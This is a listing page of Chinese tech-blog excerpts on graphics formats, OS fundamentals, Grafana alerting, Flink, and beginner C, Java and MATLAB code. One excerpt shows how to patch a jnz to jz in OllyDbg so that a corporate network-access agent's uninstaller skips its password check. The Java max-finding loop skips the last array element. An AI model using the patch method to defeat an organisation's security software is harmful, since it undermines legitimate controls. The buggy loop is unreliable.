一张360* 480⼤小的图⽚，就占⽤ 360* 480 * 3 / 1024 / 1024 = 0.494 MB 存储空间 RGB分类： RGB555
每个像素用16bit标识，占用2个字节,RGB都用5位标识。
R R R R R G G G G G B B B B B 低字节 R = color &amp; 0x7c00; G = color &amp; 0x03e0; B = color &amp; 0x001f; RGB1555
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3c44fa7176e31098b34e504299fd095f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9dbbdc223c0c4a251ea0fc2a3b2d7efc/" rel="bookmark">
			《系统架构设计师教程》 第二章：计算机与网络基础知识
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1. 操作系统基础知识
1.1 操作系统基础知识
1.2 进程管理
1.3 存储管理
1.4 设备管理
1.5 文件管理
1.6 作业管理
2. 数据库系统基础知识
2.1 关系数据库系统基础
3. 计算机网络基础知识
3.1 计算机网络
3.2 网络工程
4.系统性能
1. 操作系统基础知识 1.1 操作系统基础知识 操作系统的作用：
通过资源管理，提高计算机系统的效率改善人机界面，向用户提供友好的工作环境 操作系统的特征：并发性、共享性、虚拟性和不确定性。
操作系统的五大管理功能：进程管理、文件管理、存储管理、设备管理和作业管理。
1.2 进程管理 进程是资源分配和独立运行的 基本单位，通常由程序、数据以及进程控制块(PCB)组成，其中PCB是进程存在的唯一标志。
进程和程序的区别在于程序是静态的指令序列，进程为执行该程序的线程而保留的资源集。
进程的三态模型：就绪、运行、阻塞。
进程的五态模型：新建、就绪、运行、阻塞、终止。
进程控制是指对系统中所有进程从创建到消亡的全过程实施有效的控制，由操作系统内核通过进程控制原语完成，进程控制原语包括：创建原语、撤销原语、挂起原语、激活原语、阻塞原语和唤醒原语。
系统中某些资源一次只能供一个进程使用，这种资源我们称之为临界资源，对临界资源实施操作的那段程序，我们称之为临界区，临界区的管理规则是：有空即进、无空则等，有限等待、让权等待。
进程调度算法：先来先服务、时间片轮转、优先级调度和多级反馈调度
死锁：两个及其以上的进程互相都因请求对方已经占有的资源，无限期的等待并无法继续运行下去的现象。
死锁原因：资源竞争及进程推进顺序非法。
产生死锁的必要条件：互斥条件、请求保持条件、不可剥夺条件以及环路条件。
解决死锁的策略：鸵鸟策略(不理睬策略)、预防策略、避免策略（精心分配资源以及动态回避死锁）、检测和解除死锁（一旦发生死锁，系统不但能检测出，还能解除）。
1.3 存储管理 存储器的发展方向是：高速、大容量和小体积。
存储管理的对象是主存储器(简称 主存/内存)。
存储管理的功能包括：主存储器的分配和回收，提高主存利用率、存储保护以及主存扩充。
存储管理的方式有：分区存储管理、分页存储管理、分段存储管理、段页式存储管理以及虚拟存储管理。
地址重定位：将持续的逻辑地址转换成主存的物理地址的过程。
地址重定位有两种方式：
静态重定位：在程序执行之前进行重定位，即装入内存时重定位。动态重定位：在程序执行期间，在每次存储访问之前进行地址重定位。 1.4 设备管理 设备管理的目标是：提高设备的利用率，为用户提供方便统一的界面。
设备管理的主要功能：动态地掌握并记录设备的状态、设备的分配和释放、缓存区管理、操作物理输入输出设备、提供设备使用的用户接口、设备的访问和控制、输入输出缓冲和调度。
从使用特性角度，设备可以分为：
存储设备输入/输出设备终端设备脱机设备 从资源分配角度，设备可以分为：
独占设备共享设备虚拟设备 从从属关系角度，设备可以分为：
系统设备用户设备 从数据组织方式角度，设备可以分为：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9dbbdc223c0c4a251ea0fc2a3b2d7efc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d72a6fe6ec038c08624bf262f3156758/" rel="bookmark">
			Grafana alert预警&#43;钉钉通知
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 Grafana alert预警 如下图所示，主要是前3步，设置alert rules、contact points 、notification policies。alert rules主要设置触发警告的规则；contact points设置通过什么发送预警，如钉钉；notification policies 将alert rules与contact points关联起来。
也如下面流程图所示，notification policies 将alert rules与contact points关联起来。Grafana通过为警报分配标签来处理警报通知，alert rules有定义label，即给不同的触发规则定义label。notification policies里配置label和contact points的关系。
所以接下来，我们配置下上面这几部分，可以是接到钉钉规则。
2 Webhook 用钉钉通知预警信息，需要webhook，所以，我们介绍下webhook。
在传统的web server设计中,我们项目A想要获取项目B的数据,通常项目B需要提供一个API,然后项目A去请求项目B的API,从而获得数据,这样的过程我们称之为"拉"数据。
webhook机制:项目A提供一个webhook url,每次项目B创建新数据时,便会向项目A的hook地址进行请求,项目A收到项目B的请求,然后对数据进行处理。都常应用于异步编程中,如:高安全的支付、微信登录(OAuth)、资源同步、资源创建与更新、耗时较长。
当我们使用web hook机制需要特别注意的问题：
当服务提供者通过web hook将数据发送你的服务端后,就不会再去关注这些数据。假设你的服务端此时出现了崩溃,或者无法请求成功等原因,就需要主动去尝试请求数据。webhook会发出大量的请求,可能会造成你的应用阻塞,在此需要确保你的应用能够处理好这些请求。
3 获取钉钉webhook 在钉钉pc版上，打开群聊，打开群设置，如下图
选择智能群助手，然后如下图。
选择“添加机器人”，选择“自定义”。
添加机器人名字，同时可以进行一些安全设置，我采用“自定义关键词”，即推送的消息里要含有配置的关键词。
点击完成，获得webhook地址。
4 contact points配置钉钉webhook 如下图，在contact points中点击“new contact point”,新建一个预警推送方式。
如下配置即可，url里填上webhook地址，message含关键词（第2节webhook关键词）。
5 配置alert rules 1） 配置监控的数据，通过flux语言查询。可以参考https://blog.csdn.net/zephyr_wang/article/details/126780783
2）设置上面查到的A的值的条件，我下面设置的A大于55即触发预警。这个地方可以设置多个条件。设置后的是B。如果还想加数据，继续可以添加C等等，如下图的 add query是增加数据，add expression是增加基于数据的条件。
3）添加多久时间触发上面的条件，下面配置的1m（1分钟）。for配置的时间，表示报警状态为 Pending 后等待 5m 变成 Firing 状态，一旦变成 Firing 状态则将报警发送到 AlertManager。
4）主要是添加一下预警的名称之类的，方便识别预警。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d72a6fe6ec038c08624bf262f3156758/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4eb5887b334ea0f018298c442ad39866/" rel="bookmark">
			url参数&#43;，&amp;，=，/等转义编码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 问题描述 在使用postman发送请求时，url出现了有+，空格，/，?，%，#，&amp;，= 等特殊符号，可能在转义之后导致服务器端无法获得正确的参数值。
解决办法 将这些字符转化成服务器可以识别的字符，对应关系表如下。
符号URL中转义结果转义码+URL中+号表示空格%2B空格URL中的空格可以用+号或者编码%20/分隔目录和子目录%2F?分隔实际的URL和参数%3F%指定特殊字符%25#表示书签%23&amp;URL中指定的参数间的分隔符%26#URL中指定参数的值%26=URL中指定参数的值%3D 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a4e18814681e5807af60da58c7df7524/" rel="bookmark">
			【UV打印机】PrintExp打印软件教程(二)-主界面介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 00. 目录 文章目录 00. 目录01. PrintExp概述02. PrintExp工具栏03. PrintExpZ轴控制04. PrintExp专色界面05. PrintExp状态栏06. PrintExp其它07. 附录 01. PrintExp概述 PrintExp软件主界面如下图所示
PrintExp软件的主界面主要包括主菜单区，工具栏区，界面显示区，状态栏。 以下是上述部分的介绍。
主菜单的菜单树如下图所示：
02. PrintExp工具栏 03. PrintExpZ轴控制 测高动作流程，判断X是否在原点
1：Z轴运动到上升高度。
2：根据XY移出距离，使用不同模式到指定位置。
3：根据弹出时间弹出测高器。
4：Z轴下降。
5：测高器碰到物体弹回测高器，弹出微调窗口确认测高位置。
6：完成测高，测高会根据测高偏移进行Z轴偏移运动，完成测高。
04. PrintExp专色界面 功能说明：可进行对PRN文件原有通道数据进行软件处
具体功能：
A. 专色1，专色2：表示可以操作2个PRN数据通道
B. 开启：勾选生效，并选用指定的PRN通道（具体支持多少通道由固件配置决定）
C. 墨量：控制专色墨量百分比（0~100）
D. 来源：对不同方式的专色的数据进行参数设置
·全铺：对指定的通道全出色块，画布为整个画布全铺，包括连晒的间隔，单元为单元全铺，连晒间隔不铺
·RIP：对锐好的文件进行操作其他参数
·图像：表示选用的PRN通道数据从其他PRN通道数据复制过来使用，图像墨量表示复制相同墨量，不能修改墨量，相同墨量表示复制图像轮廓，墨量相同并且可以修改墨量
E. 缩进：指对选用的PRN通道数据四周按参数缩进像素
F. 点类型控制：可对专色通道使用不同的点打印
备注说明：专色界面只要不变灰可以编辑状态表示同步有效
05. PrintExp状态栏 状态栏功能说明
06. PrintExp其它 加载参数：从板卡上加载参数到控制软件上
保存参数：从控制软件将参数保存到主板中
X位置：显示当前X位置
Y位置：显示当前Y位置
Z位置：显示当前Z位置
07. 附录 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5cd0b0ce9bcf593a9e0666eb90e1f38f/" rel="bookmark">
			数据集积累学习---CoCo数据集（and others）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		关于CoCo数据集： 是大规模的数据集。是目标检测领域一个比较有名的数据集包含了自然图片，生活中常见的目标图片，背景比较复杂，目标数量比较多，目标尺寸更小，所以在该数据集上的任务更难。对于检测任务，衡量一个模型的好坏更倾向于使用CoCo数据集上的检测结果。COCO有5种类型的标注，分别是：物体检测、关键点检测、实例分割、全景分割、图片标注，都是对应一个json文件。根据任务记录相关数据集： 图像分类任务： 分类需要二进制的标签来确定目标是否在图像中。著名的数据集有CIFAR-10 和CIFAR-100（在32X32图像上分别提供10和100类），imagenet（22000类，每类500-1000图像）目标检测： 通过bounding box确定目标位置。数据集： caltech pedestrian detaset（包含350000个bounding box标签），PASCAL VOC数据（包括20个目标，over11000图像，over27000个目标bounding box）imagenet数据下获取的detection数据集（200类，400000张图像，350000个bounding box）。由于一些目标之间有着强烈的关系而非独立存在，在特定场景下检测某种目标是是否有意义的，因此精确的位置信息比bounding box更加重要。语义场景标注：需要像素级的标签。数据集主要包括室内场景和室外场景的，一些数据集包括深度信息。SUN dataset（包含908个场景类，3819个常规目标类(person, chair, car)和语义场景类(wall, sky, floor)，每类的数目具有较大的差别）其他数据集：Middlebury datasets，包含立体相对，多视角立体像对和光流；Berkeley Segmentation Data Set (BSDS500)可评价分割和边缘检测算法 参考：目标检测数据集MSCOCO详解 - 知乎 (zhihu.com)
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aacab540037c61a3af83fee915ef8ca4/" rel="bookmark">
			Flink1.14 connector-jdbc插入更新(Upsert)模式的源码解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基于flink jdbc方言(dialect)里不同Statement何时、如何被调用的思考。
前言：在修改flink-connector-jdbc源码时，观察到jdbc有方言的实现，在 JdbcDialect.class 里存在insert/update和upsert两种更新语义，所以研究下何种情况执行insert/update，何种情况执行upsert。如有任何错误，欢迎大家指正。
flink jdbc插入模式主要分为两类： 1、Append-Only
仅追加流，简单来讲，不管数据重不重复，只是往里添加。
2、Upsert
更新插入流，即更新或者插入，一般要求 sink 端数据库需要唯一的键值。例如 Mysql 的 INSERT INTO ... ON DUPLICATE KEY UPDATE ...语法。
一、jdbc方言 既然 flink sql 可以适配多种数据库，所以在 jdbc 方言方面肯定会有不同的适配，flink 适配的interface就是 JdbcDialect.class
JdbcDialect.class
/** Handle the SQL dialect of jdbc driver. */ @Internal public interface JdbcDialect extends Serializable { /** * Get the name of jdbc dialect. * * @return the dialect name. */ String dialectName(); /** * Check if this dialect instance can handle a certain jdbc url.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aacab540037c61a3af83fee915ef8ca4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7b70e4a9a4e6fc119fd486e87f25ee82/" rel="bookmark">
			入网小助手IsAgent卸载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		入网小助手IsAgent卸载
暑期实习的时候装了公司的入网小助手，今天卸载的时候突然发现要密码。
卸载思路来源于
上网小助手IsAgent卸载程序破解
https://www.52pojie.cn/thread-1428177-1-1.html
(出处: 吾爱破解论坛)
转载于：http://www.phpheidong.com/blog/article/127152/4904c9a37f068c09815c/
打开任务管理器找到IsaHelp进程，然后右击打开文件所在位置 接下来用Ollydbg打开这个文件(Ollydbg需要管理员权限运行) 打开时要注意加上-remove参数
打开后在主窗口右击进行查找参考文本，如图： 拖动滚动条找到如下图所示的文字信息，并双击这一行 双击跳转到主窗口，我们可以看到选中行上面有一条0F85 7C000000 jnz IsaSetup.00402E13指令 jnz是汇编条件转移指令，那么我们将条指定改为jz是不是就变成了与原来相反的结果，即不需要验证码。双击这条指令后会弹出窗口在输入框里将jnz改为jz，并点击汇编按钮，点完按钮后窗口不会消失需要点取消。
完成操作后会发现这一条变红了，jnz也变成了je
按F9(调试→汇编)运行试一下，经过几秒的等待果然出现了我们想要的结果
点击确定就可以进行卸载了，卸载后可能会提示重启系统。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0ba8af254f691ba91078b41c39293d43/" rel="bookmark">
			java 找最大数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
代码
运行结果
总结
代码 package itheima; public class test01 { public static void main(String[] args) { int []array={1,2,33,4,9}; //定义一个整数max来记录最大值，定义初始值为array[0]而不是0，是以为考虑到array中全是负数的情况。 int max=array[0]; //利用for循环遍历，这里有个小技巧，在idea中，我们只需要输入：数组名.fori便可以打出for循环 //array.length表示数组的长度 for (int i = 0; i &lt; array.length-1; i++) { if(array[i]&gt;max){ max=array[i]; } } System.out.println(max); } } 运行结果 总结 1.idea中可以利用：数组名.fori来快速输出循环
2.要考虑到数组中全是负数的情况，因此不能将max定义为0。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5fde1224a2b91e323a5065eb4d9a8093/" rel="bookmark">
			射频电路学习之Smith圆图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、Smith圆图的形成过程二、Smith圆图知识点总结 Smith圆图是由史密斯（Smith）创立的以映射原理为基础的图解方法。Smith圆图的提出主要是为了简化反射系数的计算，本文主要介绍我自己对Smith圆图形成过程的理解、如何根据Smith圆图读取数据以及电路发生改变后Smith圆图相应会做出哪些变化。
一、Smith圆图的形成过程 首先从反射系数进行说明，反射系数描述了特征阻抗 Z 0 Z_0 Z0​和负载阻抗 Z L Z_L ZL​之间的失配程度，具体表达式如下。
Γ 0 = Z L − Z 0 Z L + Z 0 Γ_0 = \frac{Z_L-Z_0}{Z_L+Z_0} Γ0​=ZL​+Z0​ZL​−Z0​​
其中 Z L = R + j X Z_L = R + jX ZL​=R+jX
在进行射频通信时，我们往往希望传输线传输距离远并且传输功率足够大，同时也希望传输线的损耗足够小。贝尔实验室做了很多实验，最终发现符合这种大功率传输的传输线，其特征阻抗分别是30欧姆和77欧姆。其中30欧姆的传输线可以传输的功率是最大的，77欧姆的传输线传输信号的损耗是最小的。为了二者兼顾，通常传输线的特征阻抗选为50Ω。
所以 Γ 0 = Z L − Z 0 Z L + Z 0 = Z L − 50 Z L + 50 Γ_0 = \frac{Z_L-Z_0}{Z_L+Z_0} = \frac{Z_L-50}{Z_L+50} Γ0​=ZL​+Z0​ZL​−Z0​​=ZL​+50ZL​−50​
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5fde1224a2b91e323a5065eb4d9a8093/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c31b29e71a6112bb2442b7700c964db9/" rel="bookmark">
			[足式机器人]Part4 刚体动力学 Ch01 前言&#43;绪论——【Rigid Body Dynamics Algorithms读书笔记】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文仅供学习使用
本文参考：
《Rigid Body Dynamics Algorithms》-Roy Featherstone
刚体动力学 Ch01 前言+绪论 0. 前言1. 绪论1.1 动力学算法1.2 空间向量1.3 单位与符号1.4 导读1.5 参考文献 0. 前言 本书的目的是为了展示一些刚体动力学的主流算法，并且加以推导与解释，以便于读者创造新的算法/使用——递归牛顿-欧拉算法（ the recursive Newton-Euler algorithm）、复合（多）刚体算法（the composite-rigid-body algorithm）、铰接体算法（the articulated-body algorithm），以及一些运动学环kinematic loops与浮动机架 floating bases，主要包括：
算法的显式伪代码描述；如何建立刚体模型系统；利用分支诱导稀疏性的算法；对运动学循环和浮基系统的扩展处理；平面向量（空间向量的平面等价物）；数值误差和模型灵敏度；如何实现空间向量算法 1. 绪论 刚体动力学在电子游戏、动画、虚拟现实、仿真、运动控制系统中均有广泛应用。在这些场景中，计算机通过计算力、加速度等物理量来近似现实物理系统中的运动。书中采用 6D vectors（六维空间向量）来表示空间力和运动
1.1 动力学算法 刚体动力学定义了一组用来描述作用在物理系统上的力和产生的加速度关系的运动方程。
动力学算法则是计算这些物理量数值解的方法。
正动力学(forward dynamics)FD：给定刚体系统广义作用力，计算系统加速度。——仿真逆动力学(inverse dynamics)ID：给定响应的加速度，计算刚体系统所需施加的广义力。——运动控制、轨迹规划等混合动力学（hybrid dynamics）：给定部分相应加速度与广义力，求解剩余的物理量。 主要关注前两种动力学
刚体平衡方程： τ = H ( q ) q ¨ + C ( q , q ˙ ) \tau =H(q)\ddot{q}+C(q,\dot{q}) τ=H(q)q¨​+C(q,q˙​)
其中： q , q ˙ , q ¨ q,\dot{q},\ddot{q} q,q˙​,q¨​为位置、速度、加速度向量； τ \tau τ是广义力向量； H H H是由位置向量所确定的惯量矩阵； C C C是科氏（ Coriolis）力、离心（centrifugal）力、重力等其他作用在系统上的非外驱动力，由位置、速度向量所确定； H ， C H，C H，C都是运动学的系数，而 τ , q ¨ \tau ,\ddot{q} τ,q¨​为变量。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c31b29e71a6112bb2442b7700c964db9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/115dda3244422a6f9fbc7dfce6ecd982/" rel="bookmark">
			从 VHDX 文件恢复 (导入) WSL 2 安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Microsoft 官方以及常见的 WSL 导入导出方式, 都是通过 wsl --export 生成 tar 文件而使用 wsl --import 命令完成导入.
但是, 有时候出于某些意外, 比如系统出现严重问题需要重装, 或者其他导致注册表丢失的情况, Windows 丢失了 WSL 安装相关的信息, 将无法使用上述的方式进行导出.
不过, 只要还有 WSL 所在的 VHDX 文件 (虚拟磁盘文件), 就没有问题, 因为 WSL 最关键的就是这个虚拟磁盘文件, 只需要在注册表中重建相应的信息就能正常使用.
有时候 WSL 磁盘文件过大, 导入导出时容易出现问题, 这种方式也是适用的.
本文讲解的思路主要来自于 Issue #4762 - Microsoft/WSL.
注册表丢失的情况 笔者在重装系统之前, 是通过 Microsoft Store 安装的 Ubuntu 发行版. 应用商店中的数据一般在 %LocalAppData%/Packages 1 下.
重置系统 (选择保留个人数据) 后, 数据文件会被 迁移 到 Windows.old 中, 也就是 X:/Windows.old/Users/%UserName%/AppData/Local/Packages 中.
其中, 商店里安装的 Ubuntu 发行版对应的包名会以 CanonicalGroupLimited.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/115dda3244422a6f9fbc7dfce6ecd982/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/08b1d62ceb3f646fc5df7ff78c66fdbb/" rel="bookmark">
			批处理命令的应用——批量删除多个文件名中的相同字符串
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		批处理命令的应用——批量删除多个文件名中的相同字符串
批处理命令的应用——批量删除多个文件名中的相同字符串 批量删除多个文件名中的相同字符串，就是将多个文件名中相同的内容删除，文件名中还剩有其他字符或者字符串。实现这个目的的方法有很多，其中采用批处理命令比实现起来比较简单。批处理命令文件的扩展名是“bat”，通常建立批处理文件的方法是先新建一个文本文档，然后在文本文档中输入批处理命令，保存后，将该文本文档修改扩展名为“bat”。
第一步：右键点击下载好的压缩文件，选择“解压缩…(E)”，将压缩文件转换为普通文件夹。 第二步，打开解压缩后的文件夹。 第三步，在打开的文件夹中新建一个文本文档。 第四步，将这个文本文档重命名为：“批量删除多个文件中的相同字符串.txt”。 第五步，打开文本文档“批量删除多个文件中的相同字符串.txt”，输入以下内容，可以复制粘贴。 @echo off
Setlocal Enabledelayedexpansion
set “str=想要去掉的字符串”
for /f “delims=” %%i in (‘dir /b .’) do (
set “var=%%i” &amp; ren “%%i” “!var:%str%=!”)
第六步，将“想要去掉的字符串”替换为要去掉的字符串。比如这次要去掉的字符串是：2022-09-12-，那就用“2022-09-12-”替换“想要去掉的字符串”。 第七步，保存这个文本文档，并修改扩展名为“bat”，出现提示对话框：“如果改变扩展名，可能会导致文件不可用，确定要修改吗？”，选择“是”。 第八步，双击执行这个文件即可完成批量删除多个文件中的相同字符串。 注意事项：新建的文本文档一定要和被修改的文件在同一目录或者同一文件夹下。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/78730e36777cb0ecb5cd2d9a03947230/" rel="bookmark">
			MATLAB练习题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		生成一个10行10列的随机矩阵，求每行的平均值，并求最大平均值的行号。 A = rand(10,10); B = []; for n = 1:10 C = A(n,:); z = sum(C)/10; B = [B, z]; [x,y] = max(B); end 写一个函数，x=mysort(x)，要求用冒泡法对x排序，并用测试程序对其进行测试。 function x=mysort(x) x_len=length(x); for i=1:x_len-1 for j=1:x_len-i if(x(j)&gt;x(j+1)) [x(j),x(j+1)]=swap(x(j),x(j+1)); end end disp([num2str(i),'.Sort:x=',num2str(x)]); end y=x; end function [a,b]=swap(x,y) a=y; b=x; end X=randperm(9); disp(['Before Sort:X=',num2str(X)]); disp('--------------------'); y=mysort(X); disp(['Bubble Sort:x=',num2str(y)]); 画出函数y = cosx(0.5+3sinx/1+x^2)在[0,2π]区间的曲线. x = 0:pi/2:2*pi; y = cos(x * (0.5 + (3 * sin(x) / (1 + x.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/78730e36777cb0ecb5cd2d9a03947230/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b64b0834777ac7d00866b5577a660df0/" rel="bookmark">
			C语言结构体实战---处理学生信息
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		结构体是C语言中一种重要的数据类型，该数据类型由一组称为成员（或称为域，或称为元素）的不同数据组成，其中每个成员可以具有不同的类型。结构体通常用来表示类型不同但是又相关的若干数据。
结构体类型不是由系统定义好的，而是需要程序设计者自己定义的，这就为表示一体不同类型数据提供了很大便利。
题目要求：利用结构体表示学生信息，（学生人数不定可自定义为n，n为整数）其中学生信息有学号、姓名、计算机成绩、数学成绩。
要求构造input函数 输入学生信息，output函数输出学生信息，avg函数输出学生平均成绩，pass函数统计及格和不及格学生人数，maxc函数查找计算机成绩最高的学生。
因为学生人数不定那么我们可以利用结构体数组来表示学生信息，每一个结构体数组的元素即为一个学生信息。
可表示如下
struct Student{
long num; // 学号（学号过长可以使用字符串表示）
char name[20]; // 姓名
float score[2]; // 数学计算机成绩
float aver; // 平均成绩
};
这里用long来定义学生学号主要是防止学号过长导致数据溢出问题，如果学号超过9223372036854775807 （long长整型表示最大的数）可以使用char型数组来表示学号
接下来就是像遍历常规数组一样对数组的元素进行操作，只不过这个数组元素是一个结构体罢了，为了更直观理解，函数实现部分写在了注释里。
🌟代码实现 #include &lt;stdio.h&gt; #define STUDENTS_NUMBER 3 struct Student{ long num; char name[20]; float score[2]; float aver; }; struct Student* input(struct Student students[]); void output(struct Student *p1); void avg(struct Student *p1); void pass(struct Student *p1); void maxc(struct Student student[]); int main(void) { struct Student students[STUDENTS_NUMBER]; struct Student *p = students, *p1; p1 = input(p); output(p1); avg(p1); pass(p1); maxc(students); return 0; } struct Student* input(struct Student students[]) { int i; printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b64b0834777ac7d00866b5577a660df0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/986b2937751e9438b6ccad5845259d3f/" rel="bookmark">
			Linux线程的基本使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一.基本概念
二.线程
1. 线程创建
2. 线程退出
3. 线程等待
4. 线程创建Demo
三. 互斥锁
1. 创建及销毁互斥锁
2. 加锁及解锁
3. 互斥锁Demo
4.面试问题（进入死锁）
四. 条件
1. 创建及销毁条件变量
2. 等待
3. 触发
4. 条件Demo
五. 程序员检查代码小技巧
一.基本概念 典型的UNIX/Linux进程可以看成只有一个控制线程：一个进程在同一时刻只做一件事情。有了多个控制线程后，在程序设计时可以把进程设计成在同一时刻做不止一件事，每个线程各自处理独立的任务。
父进程创建子进程，都会消耗内存（拷贝）。进程是程序执行时的一个实例，是担当分配系统资源（CPU时间、内存等）的基本单位。进程本身不是基本运行单位，而是线程的容器。程序本身只是指令、数据及其组织形式的描述，进程才是程序（那些指令和数据）的真正运行实例。程序是静态的，进程是动态的。
"进程——资源分配的最小单位，线程——程序执行的最小单位"多进程程序要比多线程程序健壮。
多线程开发在 Linux 平台上已经有成熟的 pthread 库支持。其涉及的多线程开发的最基本概念主要包含三点：线程，互斥锁，条件。其中，线程操作又分线程的创建，退出，等待 3 种。互斥锁则包括 4 种操作，分别是创建，销毁，加锁和解锁。条件操作有 5 种操作：创建，销毁，触发，广播和等待。
二.线程 1. 线程创建 #include &lt;pthread.h&gt; int pthread_create(pthread_t *restrict tidp, const pthread_attr_t *restrict attr, void *(*start_rtn)(void *), void *restrict arg); 当pthread_create成功返回时，由tidp指向的内存单元被设置为新创建线程的线程ID。attr参数用于定制各种不同的线程属性，暂可以把它设置为NULL，以创建默认属性的线程。
新创建的线程从start_rtn函数的地址开始运行，该函数只有一个无类型指针参数arg。如果需要向start_rtn函数传递的参数不止一个，那么需要把这些参数放到一个结构中，然后把这个结构的地址作为arg参数传入。
所有代码都是 返回：若成功返回0，否则返回错误编号
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/986b2937751e9438b6ccad5845259d3f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7d6ab00326177c69642ed102ce2eae09/" rel="bookmark">
			算法设计与分析-10302 整数的特殊划分
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 当问题是方案数时，一般都是动态规划问题。 基于递归分治的思想，如何将n的划分，下降为小于n的划分。需要注意到每一种划分中有两个数字比较重要，最小值和最大值。思考如何递归时必然从这两个值中某一个入手。
解题思路：从最大值入手。设定dp（i，j）为整数i且最大值为的划分方案数。那么可以递归向下得到dp(i,j)的方案数是：
动规方程为： 因为dp（i，j）定义的是i最大值一定是2^j的方案数，所以要求整数n的全部划分方案数时，其结果为dp(n,1)+dp(n,2)+dp(n,4)+...........的总和。
题目不能使用递归，复杂度太高，采用递推的方法，用二维数组表示dp[i][j]，按从小到大次序顺序推出所有解。算法复杂度为。
下面代码中lg数组用于求2的对数值，1&lt;&lt;j属于移位操作，将1左移j位得到的结果是。
(友情提示：本代码已开启防抄袭模式，请勿复制粘贴）
#include &lt;iostream&gt;//ASI typedef long long ll; using namespace std; int main() { ios::sync_with_stdio(0),cin.tie(0); int i,j,k,n,dp[10005][21]= {0},lg[100005],sum=0; cin&gt;&gt;n; lg[0]=-1;/**&lt;一种以2为底对数处理技巧*/ for(i=1; i&lt;=n; i++)/**&lt; 可以快速通过数组lg[i]得到以2为底i的对数 */ lg[i]=lg[i/2]+1; for(i=1; i&lt;=n; i++) { for(j=0; j&lt;=lg[i]; j++) /**&lt; dp[i][j]表示i的一个加法序列，且序列中最大值为2的j次幂 */ { if(1&lt;&lt;j==i) /**&lt; 特殊处理，当i就是2的整数次幂时，其自身也是一种方案。如8=8 */ dp[i][j]=1; for(k=0; k&lt;=j; k++) /**&lt;dp[i][j] 最大值是2的j幂，那么拿走最大值，剩下i-(1&lt;&lt;j)，其最大值只要小于2的j幂即可 */ dp[i][j]=(dp[i][j]+dp[i-(1&lt;&lt;j)][k])%100000000; } } for(i=0;i&lt;=lg[n];i++) /**&lt; n最大值为1,2,4,8....lg[n]，全部的方案数总和即为答案 */ sum =(sum+dp[n][i])%100000000; cout&lt;&lt;sum; return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/91fb8beead1f1de8f15015f4dbbb1597/" rel="bookmark">
			Response总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
